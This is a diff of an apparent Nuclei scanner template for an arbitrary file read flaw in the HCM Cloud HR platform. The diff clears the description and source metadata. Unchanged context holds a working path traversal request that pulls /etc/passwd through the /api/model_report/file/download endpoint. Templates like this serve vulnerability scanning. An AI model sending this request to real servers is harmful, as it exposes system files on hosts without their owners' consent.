@@ -3,12 +3,8 @@ info:
   name: HCM Cloud - 云端专业人力资源平台任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kadnzi3hmiwsfikc'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kadnzi3hmiwsfikc
-    fofa: icon_hash="-859381597"
 http:
 - raw:
   - 'GET /api/model_report/file/download?index=/&ext=/etc/passwd HTTP/2
@@ -43,9 +39,7 @@ http:
 
     Priority: u=0, i
 
-    Connection: close
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730077397276-382d72de-c891-4c5e-b851-d675ed5ca06e.png)'
+    Connection: close'
   redirects: false
   matchers:
   - status:
